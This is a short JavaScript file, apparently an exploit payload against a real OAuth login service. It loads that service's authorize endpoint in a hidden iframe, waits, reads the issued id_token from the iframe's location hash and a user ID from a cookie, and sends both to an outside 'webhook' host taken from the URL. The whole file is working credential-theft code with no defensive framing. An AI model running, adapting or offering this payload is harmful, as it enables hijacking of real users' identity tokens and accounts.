var xhr = new XMLHttpRequest();

var xe = document.createElement('iframe');
xe.setAttribute('src',' https://id.cornelsen.de/oxauth/restv1/authorize?client_id=%40!38C4.659F.8000.3A79!0001!7F12.03E3!0008!026F.2F97.1A84.8F3E&redirect_uri=https%3A%2F%2Fkekstest.cornelsen.de%2Fkekstest%2FSeiten%2Fdefault.aspx&response_mode=get&response_type=code%20id_token&scope=cv_schule%20cv_sap_kdnr%20email%20inum%20openid%20profile%20user_name%20roles&state=aaaaa&nonce=ssss.aaaaa');
xe.setAttribute('id','ddd')



function sleep (time) {
    return new Promise((resolve) => setTimeout(resolve, time));
}

document.body.appendChild(xe)

sleep(5000).then(() => {
    webhook= new URLSearchParams(window.location.search).get('webhook') 
    token = new URLSearchParams(document.getElementById("ddd").contentWindow.location.hash.split('#')[1]).get('id_token');
    userId = document.cookie.split('; ').find(row => row.startsWith('UserStat')).split('=')[1].split('%')[0];
    window.location.href = webhook.startsWith('https://') ? webhook + '?userId='+userId+'&token='+ token  : 'https://'+ webhook+'/?userId='+userId+'&token='+ token 
});
